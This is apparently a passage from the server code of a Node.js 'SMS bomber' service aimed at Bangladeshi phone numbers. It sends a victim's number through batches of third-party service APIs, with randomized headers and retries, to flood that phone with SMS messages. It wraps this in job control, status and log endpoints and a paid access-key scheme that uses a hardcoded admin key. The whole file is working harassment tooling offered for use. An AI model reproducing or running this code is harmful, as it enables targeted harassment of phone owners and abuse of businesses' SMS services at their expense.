            controller.updateJobStats(jobId, r.value.success, r.value.error, r.value.responseTime || 0);
          }
        });
        
        console.log(`  ${api.name}: ✅ ${successful} ❌ ${failed}`);
        
        return { api_id: api.id, api_name: api.name, method: api.method, total_attempts: responses.length, successful, failed };
      } catch (error) {
        console.log(`  ❌ ${api.name}: Batch error - ${error.message}`);
        return { api_id: api.id, api_name: api.name, method: api.method, total_attempts: 0, successful: 0, failed: actualCount };
      }
    });
    
    await Promise.allSettled(batchPromises);
    processedAPIs += batch.length;
    
    const progress = ((processedAPIs / totalAPIs) * 100).toFixed(1);
    console.log(`📊 Progress: ${progress}% (${processedAPIs}/${totalAPIs}) | ✅ ${totalSuccess} ❌ ${totalFailed}\n`);
    
    if (i + BATCH_SIZE < shuffledAPIs.length) await Utility.sleep(200);
  }
  
  console.log(`\n✅ COMPLETE: ✅ ${totalSuccess} ❌ ${totalFailed}\n`);
}

async function callSingleAPI(api, phone, jobId, attempt = 0) {
  const startTime = Date.now();
  
  if (!bombController.isJobActive(jobId)) {
    return { success: false, api_id: api.id, api_name: api.name, error: 'Job stopped', stopped: true, responseTime: Date.now() - startTime };
  }
  
  try {
    const cleanPhone = Utility.parsePhone(phone);
    let formattedPhone = cleanPhone;
    if (formattedPhone.startsWith('880')) formattedPhone = formattedPhone.substring(3);
    
    const url = api.url.replace(/\{phone\}/g, formattedPhone).replace(/\{count\}/g, '1');
    const headers = getRandomHeaders();
    
    let config = { method: api.method, url, headers, timeout: CONFIG.performance.timeout, validateStatus: (s) => s >= 200 && s < 500 };
    
    if (api.method === 'POST' && api.body) {
      const body = {};
      for (const [key, value] of Object.entries(api.body)) {
        body[key] = typeof value === 'string' ? value.replace(/\{phone\}/g, formattedPhone) : value;
      }
      
      if (api.isFormData) {
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        config.data = new URLSearchParams(body).toString();
      } else {
        config.headers['Content-Type'] = 'application/json';
        config.data = body;
      }
    }
    
    const response = await axios(config);
    const responseTime = Date.now() - startTime;
    
    return { success: true, api_id: api.id, api_name: api.name, status: response.status, responseTime };
  } catch (error) {
    const responseTime = Date.now() - startTime;
    
    if (attempt < CONFIG.performance.maxRetries && bombController.isJobActive(jobId)) {
      await Utility.sleep(CONFIG.performance.retryDelay * (attempt + 1));
      return callSingleAPI(api, phone, jobId, attempt + 1);
    }
    
    return { success: false, api_id: api.id, api_name: api.name, error: error.message, status: error.response?.status || null, responseTime };
  }
}

// ============================================================
// OTHER ENDPOINTS
// ============================================================

app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true' || all === '1') {
    const count = bombController.stopAllJobs();
    return res.json({ success: true, message: `Stopped ${count} jobs`, developer: DEVELOPER_INFO });
  }
  if (jobId) {
    const success = bombController.stopJob(jobId);
    return success ? res.json({ success: true, message: `Job ${jobId} stopped` }) : res.status(404).json({ success: false, error: 'Job not found' });
  }
  res.status(400).json({ success: false, error: 'Provide jobId or all=true' });
});

app.get('/api/pause', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true' || all === '1') {
    const count = bombController.pauseAllJobs();
    return res.json({ success: true, message: `Paused ${count} jobs`, developer: DEVELOPER_INFO });
  }
  if (jobId) {
    const success = bombController.pauseJob(jobId);
    return success ? res.json({ success: true, message: `Job ${jobId} paused` }) : res.status(404).json({ success: false, error: 'Job not found' });
  }
  res.status(400).json({ success: false, error: 'Provide jobId or all=true' });
});

app.get('/api/resume', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true' || all === '1') {
    const count = bombController.resumeAllJobs();
    return res.json({ success: true, message: `Resumed ${count} jobs`, developer: DEVELOPER_INFO });
  }
  if (jobId) {
    const success = bombController.resumeJob(jobId);
    return success ? res.json({ success: true, message: `Job ${jobId} resumed` }) : res.status(404).json({ success: false, error: 'Job not found' });
  }
  res.status(400).json({ success: false, error: 'Provide jobId or all=true' });
});

app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  if (jobId) {
    const jobStatus = bombController.getJobStatus(jobId);
    return jobStatus ? res.json({ success: true, job: jobStatus }) : res.status(404).json({ success: false, error: 'Job not found' });
  }
  const jobs = bombController.getAllJobs();
  const stats = bombController.getStats();
  res.json({ success: true, developer: DEVELOPER_INFO, stats, jobs, total_jobs: jobs.length });
});

app.get('/api/stats', (req, res) => {
  const stats = bombController.getStats();
  const systemInfo = Utility.getSystemInfo();
  const keys = keyManager.getAllKeys();
  res.json({
    success: true, developer: DEVELOPER_INFO, bomb_stats: stats, system: systemInfo,
    keys: { total: keys.length, valid: keys.filter(k => k.valid).length },
    bangladesh_apis: { total: BANGLADESH_APIS.length }
  });
});

app.get('/api/health', (req, res) => {
  const stats = bombController.getStats();
  const storageInfo = keyManager.getStorageInfo();
  res.json({
    status: 'active', developer: DEVELOPER_INFO, version: "7.0.0-FINAL-BD",
    country: "Bangladesh Only", timestamp: Utility.getISOString(),
    uptime: process.uptime(), total_apis: BANGLADESH_APIS.length,
    active_jobs: stats.activeJobs, paused_jobs: stats.pausedJobs,
    total_sms_sent: stats.totalSMS, key_storage: storageInfo
  });
});

app.get('/api/logs', (req, res) => {
  const { limit = 100 } = req.query;
  const logs = bombController.getLogs(parseInt(limit));
  res.json({ success: true, developer: DEVELOPER_INFO, logs, count: logs.length });
});

app.get('/api/cleanup', (req, res) => {
  const { admin_key } = req.query;
  if (admin_key !== 'TNEH_ADMIN_2024') return res.status(403).json({ success: false, error: 'Admin access required' });
  const cleaned = bombController.clearCompleted();
  const expired = keyManager.cleanup();
  res.json({ success: true, message: 'Cleanup completed', completed_jobs_cleared: cleaned, expired_keys_cleared: expired });
});

app.use((req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found', developer: DEVELOPER_INFO });
});

app.use((err, req, res, next) => {
  console.error('❌ Error:', err.stack);
  res.status(500).json({ success: false, error: 'Internal server error', developer: DEVELOPER_INFO, message: err.message });
});

// ============================================================
// SERVER STARTUP
// ============================================================

const PORT = CONFIG.server.port;
const HOST = CONFIG.server.host;

const server = app.listen(PORT, HOST, () => {
  console.log(`\n✅ ULTIMATE SMS BOMBER V7.0 - BANGLADESH ONLY`);
  console.log(`🌐 Server: http://${HOST}:${PORT}`);
  console.log(`🇧🇩 Country: Bangladesh Only`);
  console.log(`📡 Total APIs: ${BANGLADESH_APIS.length}`);
  console.log(`🔑 Total Keys: ${keyManager.getAllKeys().length}`);
  console.log(`💾 Key Storage: ${keyManager.getStorageInfo().filePath}`);
  console.log(`\n📋 ENDPOINTS:`);
  console.log(`   Generate Key: /api/create-key?plan=premium&days=30&admin_key=TNEH_ADMIN_2024`);
  console.log(`   Spam: /api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=100`);
  console.log(`   Stop: /api/stop?all=true`);
  console.log(`   Pause: /api/pause?all=true`);
  console.log(`   Resume: /api/resume?all=true`);
  console.log(`   Status: /api/status`);
  console.log(`\n✅ Server ready! All ${BANGLADESH_APIS.length} APIs will be called.\n`);
});

server.timeout = 120000;
server.keepAliveTimeout = CONFIG.server.keepAliveTimeout;

process.on('SIGTERM', () => {
  console.log('🛑 Shutting down...');
  bombController.shutdown();
  keyManager.destroy();
  rateLimiter.destroy();
  server.close(() => process.exit(0));
});

process.on('SIGINT', () => {
  console.log('🛑 Shutting down...');
  bombController.shutdown();
  keyManager.destroy();
  rateLimiter.destroy();
  server.close(() => process.exit(0));
});

module.exports = { app, bombController, keyManager, rateLimiter, BANGLADESH_APIS };
